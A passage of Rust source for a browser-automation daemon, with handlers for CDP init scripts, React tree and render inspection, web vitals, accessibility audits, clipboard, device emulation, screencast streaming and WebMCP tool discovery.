    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let source = cmd
        .get("script")
        .or_else(|| cmd.get("source"))
        .or_else(|| cmd.get("content"))
        .and_then(|v| v.as_str())
        .ok_or("Missing 'script' parameter")?;

    let session_identifier = mgr.add_script_to_evaluate(source).await?;
    let identifier = state.session_setup.register_init_script(
        source.to_string(),
        session_id,
        session_identifier,
    );
    Ok(json!({ "added": true, "identifier": identifier }))
}

async fn handle_removeinitscript(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let identifier = cmd
        .get("identifier")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'identifier' parameter")?;
    let (client, active_session_id, live_session_ids) = {
        let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
        (
            mgr.client.clone(),
            mgr.active_session_id()?.to_string(),
            mgr.pages_list()
                .into_iter()
                .map(|page| page.session_id)
                .collect::<HashSet<_>>(),
        )
    };
    let tracked_index = state
        .session_setup
        .init_scripts
        .iter()
        .position(|script| script.identifier == identifier);

    // Daemon-owned handles are session-wide. Remove each target-local CDP
    // registration before dropping the source that would reach future tabs.
    if let Some(index) = tracked_index {
        let session_identifiers = state.session_setup.init_scripts[index]
            .session_identifiers
            .clone();
        for (session_id, session_identifier) in session_identifiers {
            if !live_session_ids.contains(&session_id) {
                continue;
            }
            client
                .send_command(
                    "Page.removeScriptToEvaluateOnNewDocument",
                    Some(json!({ "identifier": session_identifier })),
                    Some(&session_id),
                )
                .await?;
            state.session_setup.init_scripts[index]
                .session_identifiers
                .remove(&session_id);
        }
        state.session_setup.init_scripts.remove(index);
    } else {
        client
            .send_command(
                "Page.removeScriptToEvaluateOnNewDocument",
                Some(json!({ "identifier": identifier })),
                Some(&active_session_id),
            )
            .await?;
    }
    Ok(json!({ "removed": true, "identifier": identifier }))
}

// === React / Web primitives ===

/// Parse a `Runtime.evaluate` result whose expression returned a JSON string.
/// Returns a helpful error if parsing fails.
fn parse_json_string(value: Value, what: &str) -> Result<Value, String> {
    let s = value
        .as_str()
        .ok_or_else(|| format!("{} returned non-string value", what))?;
    serde_json::from_str(s).map_err(|e| format!("{} returned invalid JSON: {}", what, e))
}

async fn handle_react_tree(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let script =
        react::scripts::TREE_SNAPSHOT.replace("{{PICK_RI}}", react::scripts::PICK_REACT_RENDERER);
    let result = mgr.evaluate(&script, None).await?;
    let nodes_json = parse_json_string(result, "react tree")?;
    let nodes: Vec<react::TreeNode> = serde_json::from_value(nodes_json)
        .map_err(|e| format!("Failed to parse tree nodes: {}", e))?;

    let return_json = cmd.get("json").and_then(|v| v.as_bool()).unwrap_or(false);
    if return_json {
        let nodes_value: Vec<Value> = nodes
            .iter()
            .map(|n| {
                json!({
                    "id": n.id,
                    "type": n.node_type,
                    "name": n.name,
                    "key": n.key,
                    "parent": n.parent,
                })
            })
            .collect();
        Ok(json!({ "nodes": nodes_value }))
    } else {
        Ok(json!({ "tree": react::format_tree(&nodes) }))
    }
}

async fn handle_react_inspect(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let fiber_id = cmd
        .get("fiberId")
        .and_then(|v| v.as_i64())
        .ok_or("Missing 'fiberId' parameter (numeric React fiber id)")?;

    let script = react::scripts::TREE_INSPECT
        .replace("{{ID}}", &fiber_id.to_string())
        .replace("{{PICK_RI}}", react::scripts::PICK_REACT_RENDERER);
    let result = mgr.evaluate(&script, None).await?;
    let parsed = parse_json_string(result, "react inspect")?;
    Ok(parsed)
}

async fn handle_react_renders_start(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    // Install for future navigations, then evaluate immediately so the
    // current page starts recording without a reload.
    let identifier = mgr
        .add_script_to_evaluate(react::scripts::RENDERS_INIT)
        .await?;
    mgr.evaluate(react::scripts::RENDERS_INIT, None).await?;
    let _ = cmd;
    Ok(json!({
        "recording": true,
        "identifier": identifier,
        "message": "recording renders - interact with the page, then run `react renders stop`"
    }))
}

async fn handle_react_renders_stop(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let result = mgr.evaluate(react::scripts::RENDERS_STOP, None).await?;
    let data_json = parse_json_string(result, "react renders stop")?;
    let data: react::RendersData = serde_json::from_value(data_json.clone())
        .map_err(|e| format!("Failed to parse renders data: {}", e))?;

    let return_json = cmd.get("json").and_then(|v| v.as_bool()).unwrap_or(false);
    if return_json {
        Ok(data_json)
    } else {
        Ok(json!({ "report": react::format_renders_report(&data) }))
    }
}

async fn handle_react_suspense(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let script =
        react::scripts::SUSPENSE_WALK.replace("{{PICK_RI}}", react::scripts::PICK_REACT_RENDERER);
    let result = mgr.evaluate(&script, None).await?;
    let boundaries_json = parse_json_string(result, "react suspense")?;
    let boundaries: Vec<react::Boundary> = serde_json::from_value(boundaries_json.clone())
        .map_err(|e| format!("Failed to parse suspense boundaries: {}", e))?;

    let return_json = cmd.get("json").and_then(|v| v.as_bool()).unwrap_or(false);
    let only_dynamic = cmd
        .get("onlyDynamic")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    if return_json {
        // When only-dynamic is set, filter the JSON payload too so callers
        // get consistent output regardless of format choice.
        if only_dynamic {
            let filtered: Vec<&react::Boundary> = boundaries
                .iter()
                .filter(|b| {
                    b.parent_id != 0
                        && (b.is_suspended
                            || !b.suspended_by.is_empty()
                            || b.unknown_suspenders.is_some())
                })
                .collect();
            Ok(json!({ "boundaries": filtered }))
        } else {
            Ok(json!({ "boundaries": boundaries_json }))
        }
    } else {
        Ok(json!({ "report": react::format_suspense_report(&boundaries, only_dynamic) }))
    }
}

async fn handle_vitals(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    // Install observers BEFORE the navigation/reload that we want to measure.
    // The script is idempotent — a no-op if already installed on the current page.
    {
        let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
        let _ = mgr.evaluate(react::scripts::VITALS_INIT, None).await?;
    }

    // Register as an init script too, so navigations done via `vitals --url`
    // start observing from the first paint.
    {
        let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
        let _ = mgr
            .add_script_to_evaluate(react::scripts::VITALS_INIT)
            .await;
    }

    // Navigate to the target URL (or reload the current page) to trigger a
    // full page load the observers can capture.
    let target = cmd.get("url").and_then(|v| v.as_str()).map(String::from);
    if let Some(url) = target {
        let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
        let _ = mgr.navigate(&url, WaitUntil::Load).await?;
    } else {
        handle_reload(state).await?;
    }

    // Give layout shifts and React effects a chance to settle.
    tokio::time::sleep(std::time::Duration::from_millis(3000)).await;

    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let url = mgr.get_url().await.unwrap_or_default();
    let result = mgr.evaluate(react::scripts::VITALS_READ, None).await?;
    let raw = parse_json_string(result, "vitals")?;

    // The raw payload has { cwv, timing, ttfb }. Merge with URL and process
    // timing into React hydration phases + per-component durations.
    let cwv = raw.get("cwv").cloned().unwrap_or(json!({}));
    let timing = raw
        .get("timing")
        .and_then(|v| v.as_array())
        .cloned()
        .unwrap_or_default();
    let ttfb = raw.get("ttfb").and_then(|v| v.as_f64());
    let lcp = cwv.get("lcp").cloned().unwrap_or(Value::Null);
    let cls_score = cwv.get("cls").and_then(|v| v.as_f64()).unwrap_or(0.0);
    let cls_entries = cwv.get("clsEntries").cloned().unwrap_or(json!([]));
    let fcp = cwv.get("fcp").and_then(|v| v.as_f64());
    let inp = cwv.get("inp").and_then(|v| v.as_f64());

    let round = |n: f64| (n * 100.0).round() / 100.0;

    let mut hydration_phases: Vec<Value> = Vec::new();
    let mut hydration_start = f64::INFINITY;
    let mut hydration_end = 0.0f64;
    let mut hydrated_components: Vec<Value> = Vec::new();
    // React's profiling build emits `console.timeStamp(label, start, end,
    // track, trackGroup, color)` entries whose `track` / `trackGroup`
    // fields are literal strings containing the atom glyph (e.g.
    // "Scheduler ⚛", "Components ⚛"). The comparisons below match those
    // exact strings — don't "clean up" the glyphs.
    for e in &timing {
        let label = e.get("label").and_then(|v| v.as_str()).unwrap_or("");
        let track = e.get("track").and_then(|v| v.as_str()).unwrap_or("");
        let track_group = e.get("trackGroup").and_then(|v| v.as_str()).unwrap_or("");
        let color = e.get("color").and_then(|v| v.as_str()).unwrap_or("");
        let start = e.get("startTime").and_then(|v| v.as_f64()).unwrap_or(0.0);
        let end = e.get("endTime").and_then(|v| v.as_f64()).unwrap_or(0.0);
        if end <= start {
            continue;
        }
        if track_group == "Scheduler ⚛" {
            hydration_phases.push(json!({
                "label": label,
                "startTime": round(start),
                "endTime": round(end),
                "duration": round(end - start),
            }));
            if label == "Hydrated" {
                if start < hydration_start {
                    hydration_start = start;
                }
                if end > hydration_end {
                    hydration_end = end;
                }
            }
        } else if track == "Components ⚛" && color.starts_with("tertiary") {
            hydrated_components.push(json!({
                "name": label,
                "startTime": round(start),
                "endTime": round(end),
                "duration": round(end - start),
            }));
        }
    }
    hydrated_components.sort_by(|a, b| {
        let da = a.get("duration").and_then(|v| v.as_f64()).unwrap_or(0.0);
        let db = b.get("duration").and_then(|v| v.as_f64()).unwrap_or(0.0);
        db.partial_cmp(&da).unwrap_or(std::cmp::Ordering::Equal)
    });

    let hydration = if hydration_start.is_finite() && hydration_end > 0.0 {
        json!({
            "startTime": round(hydration_start),
            "endTime": round(hydration_end),
            "duration": round(hydration_end - hydration_start),
        })
    } else {
        Value::Null
    };

    let data_value = json!({
        "url": url,
        "ttfb": ttfb,
        "lcp": lcp,
        "cls": { "score": round(cls_score), "entries": cls_entries },
        "fcp": fcp,
        "inp": inp,
        "hydration": hydration,
        "phases": hydration_phases,
        "hydratedComponents": hydrated_components,
    });

    // Always return the structured payload. The CLI output layer renders a
    // compact text summary in normal mode, while `--json` exposes these exact
    // fields for automation.
    Ok(data_value)
}

async fn handle_a11y(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    // Navigate first if a target URL was given, so `a11y <url>` audits a
    // fresh load rather than whatever page is currently active.
    if cmd.get("url").and_then(|v| v.as_str()).is_some() {
        // Reuse canonical navigation so element refs, selected frames, domain
        // filtering, and backend-specific behavior stay consistent.
        let _ = handle_navigate(cmd, state).await?;
        // Navigation can attach new out-of-process iframe sessions. Apply
        // those events before installing axe into the complete frame tree.
        state.drain_cdp_events_background().await?;
    }

    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;

    let tags = cmd.get("tags").and_then(|v| v.as_str());
    let selector = cmd.get("selector").and_then(|v| v.as_str());
    // Run private partial audits throughout the frame tree, then merge their
    // serialized results through the vendored top-frame engine.
    let session_id = mgr.active_session_id()?;
    let raw = a11y::run_audit(
        &mgr.client,
        session_id,
        &state.iframe_sessions,
        tags,
        selector,
    )
    .await?;
    if let Some(err) = raw.get("error").and_then(|v| v.as_str()) {
        return Err(err.to_string());
    }
    Ok(raw)
}

async fn handle_pushstate(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let url = cmd
        .get("url")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'url' parameter")?;
    let script = react::scripts::PUSHSTATE.replace(
        "{{URL}}",
        &serde_json::to_string(url).unwrap_or_else(|_| "\"\"".to_string()),
    );
    let result = mgr.evaluate(&script, None).await?;
    let after = result.as_str().map(String::from).unwrap_or_default();
    Ok(json!({ "url": after }))
}

async fn handle_addstyle(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let content = cmd
        .get("content")
        .or_else(|| cmd.get("css"))
        .and_then(|v| v.as_str());
    let url = cmd.get("url").and_then(|v| v.as_str());

    if content.is_none() && url.is_none() {
        return Err("At least one of 'content' or 'url' is required".to_string());
    }

    if let Some(href) = url {
        let js = format!(
            r#"new Promise((resolve, reject) => {{
                const link = document.createElement('link');
                link.rel = 'stylesheet';
                link.href = {};
                link.onload = () => resolve(true);
                link.onerror = () => reject(new Error('Failed to load stylesheet'));
                document.head.appendChild(link);
            }})"#,
            serde_json::to_string(href).unwrap_or_default()
        );
        mgr.evaluate(&js, None).await?;
    } else if let Some(css) = content {
        let js = format!(
            r#"(() => {{
                const style = document.createElement('style');
                style.textContent = {};
                document.head.appendChild(style);
            }})()"#,
            serde_json::to_string(css).unwrap_or_default()
        );
        mgr.evaluate(&js, None).await?;
    }

    Ok(json!({ "added": true }))
}

async fn handle_clipboard(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let action = cmd
        .get("subAction")
        .or_else(|| cmd.get("operation"))
        .and_then(|v| v.as_str())
        .unwrap_or("read");

    let session_id = mgr.active_session_id()?.to_string();

    // cfg! is compile-time; assumes the browser runs on the same OS as the CLI binary.
    let modifier: i32 = if cfg!(target_os = "macos") { 4 } else { 2 };

    match action {
        "write" => {
            let text = cmd
                .get("text")
                .or_else(|| cmd.get("value"))
                .and_then(|v| v.as_str())
                .ok_or("Missing 'text' parameter")?;
            let js = format!(
                "navigator.clipboard.writeText({})",
                serde_json::to_string(text).unwrap_or_default()
            );
            mgr.evaluate(&js, None).await?;
            Ok(json!({ "written": text }))
        }
        "copy" => {
            interaction::press_key_with_modifiers(&mgr.client, &session_id, "c", Some(modifier))
                .await?;
            Ok(json!({ "copied": true }))
        }
        "paste" => {
            interaction::press_key_with_modifiers(&mgr.client, &session_id, "v", Some(modifier))
                .await?;
            Ok(json!({ "pasted": true }))
        }
        _ => {
            let result = mgr.evaluate("navigator.clipboard.readText()", None).await?;
            Ok(json!({ "text": result }))
        }
    }
}

/// Dispatches a wheel event and updates the tracked pointer only after CDP accepts it.
async fn handle_wheel(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let delta_x = cmd.get("deltaX").and_then(|v| v.as_f64()).unwrap_or(0.0);
    let delta_y = cmd.get("deltaY").and_then(|v| v.as_f64()).unwrap_or(0.0);
    let mut mouse_state = state.mouse_state;
    let params = build_mouse_event_params(
        &mut mouse_state,
        "mouseWheel",
        cmd.get("x").and_then(|v| v.as_f64()),
        cmd.get("y").and_then(|v| v.as_f64()),
        None,
        None,
        None,
        Some(delta_x),
        Some(delta_y),
        None,
    );

    mgr.client
        .send_command_typed::<_, Value>("Input.dispatchMouseEvent", &params, Some(&session_id))
        .await?;
    state.mouse_state = mouse_state;

    Ok(json!({ "scrolled": true, "deltaX": delta_x, "deltaY": delta_y }))
}

async fn handle_device(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let name = cmd
        .get("name")
        .or_else(|| cmd.get("device"))
        .and_then(|v| v.as_str())
        .ok_or("Missing 'name' parameter")?;

    let (width, height, scale, mobile, ua) = match name.to_lowercase().as_str() {
        "iphone 15" | "iphone15" => (393, 852, 3.0, true, "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"),
        "iphone 16" | "iphone16" => (393, 852, 3.0, true, "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"),
        "iphone 16 pro" | "iphone16pro" => (402, 874, 3.0, true, "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"),
        "iphone 17" | "iphone17" => (402, 874, 3.0, true, "Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Mobile/15E148 Safari/604.1"),
        "ipad" | "ipad air" => (820, 1180, 2.0, true, "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/604.1"),
        "ipad pro" => (1024, 1366, 2.0, true, "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/604.1"),
        "pixel 9" | "pixel9" => (412, 923, 2.625, true, "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36"),
        "galaxy s25" | "galaxys25" => (360, 800, 3.0, true, "Mozilla/5.0 (Linux; Android 15; SM-S931B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36"),
        // Legacy aliases
        "iphone 12" | "iphone12" => (390, 844, 3.0, true, "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"),
        "iphone 14" | "iphone14" => (390, 844, 3.0, true, "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"),
        "pixel 5" | "pixel5" => (393, 851, 2.75, true, "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36"),
        "pixel 7" | "pixel7" => (412, 915, 2.625, true, "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"),
        "galaxy s21" | "galaxys21" => (360, 800, 3.0, true, "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36"),
        _ => return Err(format!("Unknown device: {}. Supported: iPhone 15, iPhone 16, iPhone 16 Pro, iPhone 17, iPad, iPad Pro, Pixel 9, Galaxy S25", name)),
    };

    mgr.set_viewport(width, height, scale, mobile).await?;
    mgr.set_user_agent(ua).await?;

    state.viewport = Some((width, height, scale, mobile));
    state.session_setup.user_agent = Some(ua.to_string());

    // Update stream server viewport so status messages and screencast use the new dimensions
    if let Some(ref server) = state.stream_server {
        server.set_viewport(width as u32, height as u32).await;
    }

    Ok(json!({
        "device": name,
        "width": width,
        "height": height,
        "deviceScaleFactor": scale,
        "mobile": mobile,
    }))
}

// ---------------------------------------------------------------------------
// Stream handlers
// ---------------------------------------------------------------------------

fn stream_file_path(session_id: &str) -> PathBuf {
    SessionFile::Stream.path(session_id)
}

fn write_stream_file(session_id: &str, port: u16) -> Result<(), String> {
    let path = stream_file_path(session_id);
    fs::write(&path, port.to_string()).map_err(|e| {
        format!(
            "Failed to write stream metadata '{}': {}",
            path.display(),
            e
        )
    })
}

fn remove_stream_file(session_id: &str) -> Result<(), String> {
    let path = stream_file_path(session_id);
    match fs::remove_file(&path) {
        Ok(()) => Ok(()),
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(err) => Err(format!(
            "Failed to remove stream metadata '{}': {}",
            path.display(),
            err
        )),
    }
}

fn engine_file_path(session_id: &str) -> PathBuf {
    SessionFile::Engine.path(session_id)
}

fn write_engine_file(session_id: &str, engine: &str) {
    let _ = fs::write(engine_file_path(session_id), engine);
}

fn remove_engine_file(session_id: &str) {
    let _ = fs::remove_file(engine_file_path(session_id));
}

fn provider_file_path(session_id: &str) -> PathBuf {
    SessionFile::Provider.path(session_id)
}

fn write_provider_file(session_id: &str, provider: &str) {
    let _ = fs::write(provider_file_path(session_id), provider);
}

fn remove_provider_file(session_id: &str) {
    let _ = fs::remove_file(provider_file_path(session_id));
}

fn extensions_file_path(session_id: &str) -> PathBuf {
    SessionFile::Extensions.path(session_id)
}

fn write_extensions_file(session_id: &str, settings: &Running) {
    if let Some(contents) = settings.extensions_file_contents() {
        let _ = fs::write(extensions_file_path(session_id), contents);
        return;
    }
    let _ = fs::remove_file(extensions_file_path(session_id));
}

fn write_extensions_file_from_paths(
    session_id: &str,
    settings: &Running,
    extensions: Option<&[String]>,
) {
    let Some(paths) = extensions else {
        write_extensions_file(session_id, settings);
        return;
    };

    let joined = paths
        .iter()
        .map(|path| path.trim())
        .filter(|path| !path.is_empty())
        .collect::<Vec<_>>()
        .join(",");
    if joined.is_empty() {
        let _ = fs::remove_file(extensions_file_path(session_id));
    } else {
        let _ = fs::write(extensions_file_path(session_id), joined);
    }
}

fn remove_extensions_file(session_id: &str) {
    let _ = fs::remove_file(extensions_file_path(session_id));
}

async fn current_stream_status(state: &DaemonState) -> Value {
    debug_assert_eq!(
        state.stream_server.is_some(),
        state.stream_client.is_some(),
        "stream server and stream client slot should be set together"
    );

    let connected = match state.browser.as_ref() {
        Some(mgr) => mgr.is_connection_alive().await,
        None => false,
    };
    let runtime_screencasting = match state.stream_server.as_ref() {
        Some(server) => server.is_screencasting().await,
        None => false,
    };

    json!({
        "enabled": state.stream_server.is_some(),
        "port": state
            .stream_server
            .as_ref()
            .map(|server| Value::from(server.port()))
            .unwrap_or(Value::Null),
        "connected": connected,
        "screencasting": connected && (state.screencasting || runtime_screencasting),
    })
}

async fn handle_stream_enable(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    if state.stream_server.is_some() {
        return Err("Streaming is already enabled for this session".to_string());
    }

    let requested_port = match cmd.get("port").and_then(|value| value.as_u64()) {
        Some(raw) => u16::try_from(raw)
            .map_err(|_| format!("Invalid stream port '{}': expected 0-65535", raw))?,
        None => 0,
    };

    let (server, client_slot) = StreamServer::start_without_client(
        requested_port,
        state.session_id.clone(),
        false,
        state.idle_activity.clone(),
    )
    .await?;
    let port = server.port();
    if let Err(err) = write_stream_file(&state.session_id, port) {
        server.shutdown().await;
        return Err(err);
    }

    state.stream_client = Some(client_slot);
    state.stream_server = Some(Arc::new(server));
    state.request_tracking = true;
    state.refresh_active_iframe_sessions().await;
    if state.screencasting {
        if let Some(ref server) = state.stream_server {
            server.set_screencasting(true).await;
        }
    }
    state.update_stream_client().await;

    Ok(current_stream_status(state).await)
}

async fn handle_stream_disable(state: &mut DaemonState) -> Result<Value, String> {
    let Some(server) = state.stream_server.clone() else {
        return Err("Streaming is not enabled for this session".to_string());
    };

    server.shutdown().await;
    state.stream_server = None;
    state.stream_client = None;
    remove_stream_file(&state.session_id)?;
    remove_engine_file(&state.session_id);
    remove_provider_file(&state.session_id);

    Ok(json!({ "disabled": true }))
}

async fn handle_stream_status(state: &DaemonState) -> Result<Value, String> {
    Ok(current_stream_status(state).await)
}

async fn webmcp_page_context(
    state: &DaemonState,
) -> Result<(Arc<CdpClient>, String, String), String> {
    if matches!(state.backend_type, BackendType::WebDriver) || state.engine != "chrome" {
        return Err(webmcp::unsupported_error(&format!(
            "active backend is {}",
            state.engine
        )));
    }
    let browser = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = browser.active_session_id()?.to_string();
    let url = browser.get_url().await?;
    {
        let filter = state.domain_filter.read().await;
        if let Some(filter) = filter.as_ref() {
            filter.check_url(&url)?;
        }
    }
    let origin = url::Url::parse(&url)
        .map(|parsed| parsed.origin().ascii_serialization())
        .unwrap_or(url);
    Ok((browser.client.clone(), session_id, origin))
}

async fn collect_webmcp_tools(state: &mut DaemonState) -> Result<Vec<webmcp::ToolRecord>, String> {
    state.drain_cdp_events_background().await?;
    let (client, session_id, origin) = webmcp_page_context(state).await?;
    let mut rx = client.subscribe();
    fn collect_origins(tree: &Value, origins: &mut HashMap<String, String>) {
        if let Some(frame) = tree.get("frame") {
            if let (Some(frame_id), Some(origin)) = (
                frame.get("id").and_then(Value::as_str),
                webmcp::frame_origin(frame),
            ) {
                origins.insert(frame_id.to_string(), origin);
            }
        }
        if let Some(children) = tree.get("childFrames").and_then(Value::as_array) {
            for child in children {
                collect_origins(child, origins);
            }
        }
    }
    let mut frame_origins = HashMap::new();
    let frame_tree = client
        .send_command_no_params("Page.getFrameTree", Some(&session_id))
        .await
        .unwrap_or_else(|_| json!({}));
    if let Some(tree) = frame_tree.get("frameTree") {
        collect_origins(tree, &mut frame_origins);
    }
    for (frame_id, frame_origin) in &frame_origins {
        state
            .webmcp
            .update_frame_origin(&session_id, frame_id, frame_origin.as_str());
    }
    client
        .send_command_no_params("WebMCP.enable", Some(&session_id))
        .await
        .map_err(|error| webmcp::unsupported_error(&error))?;

    state.webmcp.observations.insert(session_id.clone(), Ok(()));

    let deadline =
        tokio::time::Instant::now() + std::time::Duration::from_millis(webmcp::DISCOVERY_WINDOW_MS);
    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            break;
        }
        match tokio::time::timeout(remaining, rx.recv()).await {
            Ok(Ok(event))
                if event.method == "WebMCP.toolsAdded"
                    && event.session_id.as_deref() == Some(session_id.as_str()) =>
            {
                state
                    .webmcp
                    .apply_tools_added(&session_id, &event.params, &origin);
            }
            Ok(Ok(event))
                if event.method == "WebMCP.toolsRemoved"
                    && event.session_id.as_deref() == Some(session_id.as_str()) =>
            {
                state.webmcp.apply_tools_removed(&session_id, &event.params);
            }
            Ok(Ok(_)) => continue,
            Ok(Err(broadcast::error::RecvError::Lagged(_))) => continue,
            Ok(Err(broadcast::error::RecvError::Closed)) | Err(_) => break,
        }
    }
    let tools = state.webmcp.tools(&session_id)?;
    let domain_filter = state.domain_filter.read().await.clone();
    if let Some(filter) = domain_filter.as_ref() {
        for tool in &tools {
            filter.check_url(&tool.origin)?;
        }
    }
    Ok(tools)
}

/// Subscribe once per CDP page session. Ordinary actions then read the event
/// cache without renderer evaluation, repeated CDP requests, or discovery waits.
async fn enable_webmcp_events(state: &mut DaemonState) -> Result<(), String> {
    if !state.webmcp_enabled
        || state.engine != "chrome"
        || matches!(state.backend_type, BackendType::WebDriver)
    {
        return Err("WebMCP observation disabled".to_string());
    }
    let browser = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = browser.active_session_id()?.to_string();
    if let Some(result) = state.webmcp.observations.get(&session_id) {
        return result.clone();
    }
    let client = browser.client.clone();
    let result = tokio::time::timeout(std::time::Duration::from_secs(1), async {
        let tree = client
            .send_command_no_params("Page.getFrameTree", Some(&session_id))
            .await?;
        client
            .send_command_no_params("WebMCP.enable", Some(&session_id))
            .await?;
        fn update_origins(state: &mut webmcp::RuntimeState, session: &str, tree: &Value) {
            if let (Some(id), Some(origin)) = (
                tree["frame"]["id"].as_str(),
                webmcp::frame_origin(&tree["frame"]),
            ) {
                state.update_frame_origin(session, id, &origin);
            }
            if let Some(children) = tree["childFrames"].as_array() {
                for child in children {
                    update_origins(state, session, child);
                }
            }
        }
        update_origins(&mut state.webmcp, &session_id, &tree["frameTree"]);
        Ok::<(), String>(())
    })
    .await
    .unwrap_or_else(|_| Err("WebMCP observation timed out".to_string()));
    // Unsupported sessions are not probed again on every action. An explicit
    // list request can retry setup; fresh browser sessions start with no cache.
    state.webmcp.observations.insert(session_id, result.clone());
    result
}

async fn handle_webmcp_list(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mut tools = collect_webmcp_tools(state).await?;
    if let Some(name) = cmd.get("tool").and_then(Value::as_str) {
        tools =
            vec![
                webmcp::resolve_tool(&tools, name, cmd.get("frameId").and_then(Value::as_str))?
                    .clone(),
            ];
    } else if let Some(frame) = cmd.get("frameId").and_then(Value::as_str) {
        tools.retain(|tool| tool.frame_id == frame);
    }
    let mut resp = json!({"experimental": true, "untrusted": true, "tools": tools});
    // Saved flows are tools the agent observed on this site, next to the ones
    // the page declares.
    if cmd.get("tool").is_none() {
        let host = match state.browser.as_ref() {
            Some(mgr) => mgr.get_url().await.ok(),
            None => None,
        }
        .and_then(|u| url::Url::parse(&u).ok())
        .and_then(|u| u.host_str().map(String::from));
        if let Some(host) = host {
            resp["observed"] = json!(super::flow::list_flows(Some(&host)));
        }
    }
    Ok(resp)
}

async fn wait_for_webmcp_invocation(
    state: &mut DaemonState,
    invocation_id: &str,
    timeout_ms: u64,
) -> Result<Value, String> {
    let deadline = tokio::time::Instant::now() + webmcp::timeout_duration(timeout_ms);
    loop {
        state.drain_cdp_events_background().await?;
        if let Some(record) = state.webmcp.invocations.get(invocation_id) {
            if record.is_terminal() {
                return Ok(record.to_json());
            }
        } else {
            return Err(format!(
                "{}: Unknown WebMCP invocation '{}'",
                webmcp::ERR_INVOCATION_NOT_FOUND,
                invocation_id
            ));
        }
        if tokio::time::Instant::now() >= deadline {
            if let Ok((client, session_id, _)) = webmcp_page_context(state).await {
                let _ = client
                    .send_command(
                        "WebMCP.cancelInvocation",
                        Some(json!({ "invocationId": invocation_id })),
                        Some(&session_id),
                    )
                    .await;
            }
            if let Some(record) = state.webmcp.invocations.get_mut(invocation_id) {
                record.mark_timed_out();
                return Ok(record.to_json());
            }
        }
        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
    }
}

async fn handle_webmcp_invoke(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let tool_name = cmd
        .get("tool")
        .and_then(Value::as_str)
        .ok_or("Missing 'tool' parameter")?;
    let input = cmd.get("params").cloned().unwrap_or_else(|| json!({}));
    webmcp::validate_input(&input)?;
    state.webmcp.ensure_capacity()?;
    let frame_id = cmd.get("frameId").and_then(Value::as_str);
    let tools = collect_webmcp_tools(state).await?;
